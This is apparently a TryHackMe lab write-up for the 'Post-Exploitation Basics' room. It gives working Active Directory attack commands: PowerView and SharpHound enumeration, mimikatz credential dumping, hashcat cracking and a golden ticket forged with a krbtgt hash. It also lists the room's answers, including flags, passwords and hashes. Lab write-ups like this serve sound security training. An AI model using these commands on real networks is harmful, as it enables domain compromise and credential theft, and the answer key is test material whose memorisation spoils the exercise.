![Post-Exploitation Basics Banner](https://tryhackme.com/img/banners/default_tryhackme.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/postexploit/Post_Exploitation_Basics_Cover.png" alt="Post-Exploitation Basics Logo">
</p>

# Post-Exploitation Basics

This guide contains the answer and steps necessary to get to them for the [Post-Exploitation Basics](https://tryhackme.com/room/postexploit) room.

## Table of contents

- [Enumeration w/ Powerview](#enumeration-w-powerview)
- [Enumeration w/ Bloodhound](#enumeration-w-bloodhound)
- [Dumping hashes w/ mimikatz](#dumping-hashes-w-mimikatz)
- [Golden Ticket Attacks w/ mimikatz](#golden-ticket-attacks-w-mimikatz)
- [Enumeration w/ Server Manager](#enumeration-w-server-manager)
- [Maintaining Access ](#maintaining-access)

### Enumeration w/ Powerview

These questions were a bit difficult as there was no single point of information to use. Multiple posts had different commands, some of which wouldn't work. Some were not listed on each site.

1. What is the shared folder that is not set by default?

   For this I found two commands that could be of use.

   ```cmd
   Get-NetShare

   Invoke-ShareFinder
   ```

   Both would give the attached shared folders. The one without a description is most likely not default.

   POWERVIEW SHARED

   ><details><summary>Click for answer</summary>Share</details>

3. What operating system is running inside of the network besides Windows Server 2019?

   The command that could help with this is `Get-NetComputer`. This would only return a long list of data when used with `-FullData`. Now all we need to do is filter on the operating system as done in the example.

   ```cmd
   Get-NetComputer -FullData | select operatingsystem
   ```

   POWERVIEW OPERATING

   ><details><summary>Click for answer</summary>Windows 10 Enterprise Evaluation</details>

5. I've hidden a flag inside of the users find it

   For this we can actually use the same command as in the example to view the common name (cn) of the user.

   ```cmd
   Get-NetUser | select cn
   ```

   POWERVIEW FLAG

   ><details><summary>Click for answer</summary>POST{P0W3RV13W_FTW}</details>

### Enumeration w/ Bloodhound

To get the necessary data we follow the steps provided. Make sure to use a newer version of the SharpHound.ps1 file. The provided one is incompatible with the latest Bloodhound version. The version in the bloodhound folder works fine.

We copy it to the machine using scp over ssh:

```cmd
scp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 Administrator:10.10.27.24:C:/Users/Administrator/Downloads/SharpHound.ps1
```

Now we can run the script and copy the loot back to our machine.

```cmd
. .\SharpHound.ps1

Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
```

```cmd
scp Administrator:10.10.27.24:C:/Users/Administrator/Downloads/loot.zip loot.zip
```

Now we can import it into Bloodhound.

1. What service is also a domain admin

   For this we use the query: "Find all Domain Admins".

   BLOODHOUND DOMAIN ADMINS

   ><details><summary>Click for answer</summary>SQLSERVICE</details>

3. What two users are Kerberoastable?

   For this we can use the query: "List all Kerberoastable Accounts".

   BLOODHOUND KERBEROASTABLE

   ><details><summary>Click for answer</summary>SQLSERVICE, KRBTGT</details>

### Dumping hashes w/ mimikatz



misc::cmd

After connecting through ssh or rdp we must start mimikatz and give it admin privileges using `privilege:debug`.

1. what is the Machine1 Password?

   Now we can use lsadump to dump the required NTLM hashes.

   ```cmd
   lsadump::lsa /patch
   ```

   MIMIKATZ HASHES HASHES

   Using hashcat, we can crack the hash for the Machine1 user.

   ```cmd
   hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
   ```

   MIMIKATZ HASHES PASSWORD

   Remember to use the correct hash type in hashcat. If you don't remember, you can use `hashcat -h | grep NTLM` to look for the correct type for NTLM hashes.   

   ><details><summary>Click for answer</summary>Password1</details>

3. What is the Machine2 Hash?

   This hash can be found in the list of hashes dumped by `lsadump`.
   
   ><details><summary>Click for answer</summary>c39f2beb3d2ec06a62cb887fb391dee0</details>

### Golden Ticket Attacks w/ mimikatz

To create a golden ticket, we must first get more information about the krbtgt user.

```cmd
lsadump::lsa /inject /name:krbtgt
```

This should give us what we need to craft a ticket.

GOLDEN INFO

To generate a a golden ticket we need the following:

- user
- sid
- id
- domain
- krbtgt (NTLM hash)
- 

Combining these from the image above, gives us the following command:

```cmd
kerberos::golden /domain:CONTROLLER.local /user:krbtgt /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:502 
```

GOLDEN TICKET

Now we can use this to open a command window on the system with which we have access to other systems as well.

```cmd
misc::cmd
```

GOLDEN NETWORK

Unfortunately, no other systems are configured in this room, so you will need to take my word for it.

### Enumeration w/ Server Manager

1. What tool allows to view the event logs?

   Looking at the various tool available to us, one seems to be a logical choice.

   SERVER EVENTS

   ><details><summary>Click for answer</summary>Event Viewer</details>

3. What is the SQL Service password

   Using the 'Active Directory Users and Computers' tool, we can see a password stored in the description after navigating to the users tab.

   SERVER PASSWORD

   ><details><summary>Click for answer</summary>MYpassword123#</details>
